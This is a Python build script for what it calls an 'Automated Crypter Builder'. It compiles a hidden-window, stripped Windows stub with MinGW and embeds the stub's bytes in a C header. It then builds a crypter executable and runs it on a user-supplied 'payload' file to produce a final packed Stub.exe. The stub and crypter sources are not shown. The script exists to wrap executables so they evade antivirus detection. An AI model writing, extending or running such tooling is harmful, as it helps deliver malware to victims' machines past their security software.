#!/usr/bin/env python3
import sys
import os
import subprocess
import argparse
import time

def run_command(cmd, description):
    print(f"[*] {description}...")
    result = subprocess.run(cmd, shell=True)
    if result.returncode != 0:
        print(f"[-] Failed: {description}")
        sys.exit(1)
    print(f"[+] {description} completed")

def cleanup_file(filename):
    """Safely remove a file if it exists"""
    if os.path.exists(filename):
        try:
            os.remove(filename)
            print(f"[+] Removed old {filename}")
            time.sleep(0.5)  # Give OS time to release file locks
        except Exception as e:
            print(f"[-] Could not remove {filename}: {e}")
            return False
    return True

def bytes_to_c_array(bytes_data, array_name):
    hex_array = [f"0x{b:02x}" for b in bytes_data]
    array_str = ",\n    ".join([", ".join(hex_array[i:i+16]) for i in range(0, len(hex_array), 16)])
    
    return f"""// stub_bytes.h - Auto-generated from Stub.exe
#ifndef STUB_BYTES_H
#define STUB_BYTES_H

#include <cstdint>

extern const unsigned char {array_name}[];
extern const size_t {array_name}_len;

const unsigned char {array_name}[] = {{
    {array_str}
}};

const size_t {array_name}_len = {len(bytes_data)};

#endif
"""

def main():
    parser = argparse.ArgumentParser(description='Automated Crypter Builder')
    parser.add_argument('payload', help='Payload executable file')
    args = parser.parse_args()

    if not os.path.exists(args.payload):
        print(f"[-] Payload file not found: {args.payload}")
        sys.exit(1)

    print("=== AUTOMATED CRYPTER BUILDER ===")

    # Cleanup previous builds
    print("[*] Cleaning up previous builds...")
    cleanup_file('Stub.exe')  # Remove stub from previous compilation
    cleanup_file('stub_bytes.h')  # Remove old header
    cleanup_file('crypter.exe')  # Remove old crypter

    # Step 1: Compile stub
    # Step 1: Compile stub with -mwindows
    run_command(
        'x86_64-w64-mingw32-g++ -O2 -s -static -std=c++17 stub.cpp -ladvapi32 -lshlwapi -mwindows -o Stub.exe',
        'Compiling stub'
    )

    # Step 2: Convert to C header
    print("[*] Converting Stub.exe to stub_bytes.h...")
    try:
        with open('Stub.exe', 'rb') as f:
            stub_data = f.read()
        
        header_content = bytes_to_c_array(stub_data, 'Stub_exe')
        
        with open('stub_bytes.h', 'w') as f:
            f.write(header_content)
        print("[+] stub_bytes.h generated")
    except Exception as e:
        print(f"[-] Failed to generate header: {e}")
        sys.exit(1)

    # Step 3: Compile crypter
    run_command(
        'x86_64-w64-mingw32-g++ -O2 -s -std=c++17 Crypter.cpp -ladvapi32 -lshlwapi -o crypter.exe',
        'Compiling crypter'
    )

    # CRITICAL: Remove the intermediate Stub.exe before crypter runs
    print("[*] Preparing for crypter execution...")
    if not cleanup_file('Stub.exe'):
        print("[-] Cannot remove Stub.exe - file might be locked!")
        print("[-] Try closing any applications that might have it open")
        sys.exit(1)

    # Step 4: Run crypter
    print(f"[*] Running crypter with payload: {args.payload}")
    result = subprocess.run(['crypter.exe', args.payload])
    
    if result.returncode == 0:
        print("[SUCCESS] Final Stub.exe ready!")
        
        # Verify the final Stub.exe exists and has resources
        if os.path.exists('Stub.exe'):
            file_size = os.path.getsize('Stub.exe')
            print(f"[+] Final Stub.exe size: {file_size} bytes")
        else:
            print("[-] Final Stub.exe not found!")
    else:
        print("[-] Crypter execution failed!")

    print("=== BUILD COMPLETE ===")

if __name__ == "__main__":
    main()